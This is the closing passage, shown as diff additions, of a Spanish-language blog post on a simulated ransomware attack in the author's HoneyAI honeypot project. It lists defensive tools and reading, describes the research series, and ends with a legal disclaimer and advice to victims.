+- **AIDE (File Integrity):** [aide.github.io](https://aide.github.io/)
+- **Auditd:** [linux.die.net/man/8/auditd](https://linux.die.net/man/8/auditd)
+- **Fail2ban:** [fail2ban.org](https://www.fail2ban.org/)
+
+### 10.3 Lecturas Recomendadas
+
+- NIST Cybersecurity Framework: Detect & Respond
+- SANS: Ransomware Defense Best Practices
+- CIS Controls: Critical Security Controls for Effective Cyber Defense
+
+---
+
+## 11. Sobre HoneyAI
+
+HoneyAI es mi proyecto de investigación en seguridad que combina honeypots tradicionales con análisis de comportamiento mediante IA local. El objetivo es:
+
+- Capturar y analizar ataques reales en tiempo real
+- Desarrollar técnicas de detección avanzadas
+- Compartir conocimiento con la comunidad de seguridad
+- Contribuir a threat intelligence colectiva
+
+**Seguí el proyecto:**
+
+- Blog: [cobalto-sec.tech](https://cobalto-sec.tech)
+- LinkedIn: [https://www.linkedin.com/in/nicopadilla-sec/]
+
+**Serie HoneyAI:**
+
+- Parte 1: Arquitectura del Sistema
+- **Parte 2: Anatomía de un Ataque Ransomware** ← Estás aquí
+- Parte 3: Detección de APTs con IA (próximamente)
+- Parte 4: 48 Horas de Ataques Reales (próximamente)
+
+---
+
+## 12. Disclaimer Legal
+
+Este artículo es con fines puramente educativos. La simulación se ejecutó en un entorno controlado y aislado. Las técnicas descritas NO deben ser usadas para actividades ilegales. No me hago responsable del uso indebido de esta información.
+
+El ransomware real causa daño económico y operacional significativo. Si tu organización es víctima de ransomware, contactá a las autoridades (FBI, Europol, etc.) y a profesionales de respuesta a incidentes certificados.
+
+> **Warning:** Nunca pagues el rescate. No hay garantía de recuperación de datos, y pagar financia operaciones criminales futuras.
+
+---
+
+¿Preguntas o comentarios sobre este case study? Conectá conmigo en LinkedIn o dejá tu feedback en el blog.
